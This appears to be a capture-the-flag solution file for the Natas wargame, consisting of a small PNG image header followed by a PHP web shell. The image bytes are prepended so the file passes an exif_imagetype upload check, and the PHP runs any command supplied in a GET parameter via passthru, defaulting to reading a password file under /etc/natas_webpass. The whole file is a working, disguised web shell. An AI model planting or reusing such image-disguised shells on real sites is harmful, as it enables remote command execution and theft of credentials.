�PNG

   IHDR         ĉ   gAMA  ���a    cHRM  z&  ��  �   ��  u0  �`  :�  p��Q<   	pHYs  �  ��+   IDATc͟( �t�tC�    IEND�B`�

<?php
// prepend contents of a small image in this file, to bypass exif_imagetype
// same with natas12, edit the filename
echo '<pre>';
passthru(@$_GET['s'] ?: 'cat /etc/natas_webpass/natas14');
